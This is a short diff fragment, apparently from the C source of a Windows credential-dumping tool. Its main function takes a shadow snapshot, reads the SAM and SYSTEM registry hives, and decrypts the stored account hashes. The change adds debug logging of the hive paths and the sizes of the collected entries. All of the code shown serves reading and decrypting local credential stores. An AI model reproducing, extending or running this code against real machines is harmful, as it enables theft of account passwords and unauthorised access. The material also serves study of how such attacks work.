 		PSAM sam[MAX_SAM_ENTRIES] = {};
 
@@ -744,12 +1001,14 @@ int main(int argc, char** argv) {
 			printf("Unable to create shadow snapshot\n");
 			exit(1);
 		}
+		DebugPrintWideString("Shadow snapshot SAM path", sourcePathFileSAM);
+		DebugPrintWideString("Shadow snapshot SYSTEM path", sourcePathFileSYSTEM);
 
 		getSAMfromRegf(NULL, &size, sourcePathFileSAM, sourcePathFileSYSTEM);
+		DebugPrintf("Offline hive size probe returned %lu bytes (%lu entries)\n", size, size / sizeof(SAM));
 		getSAMfromRegf(sam, &size, sourcePathFileSAM, sourcePathFileSYSTEM);
+		DebugPrintf("Offline hive collection returned %lu bytes (%lu entries)\n", size, size / sizeof(SAM));
 
 		decryptSAM(sam, size / sizeof(SAM));
 	}
-
-	// Debug option TODO
 }
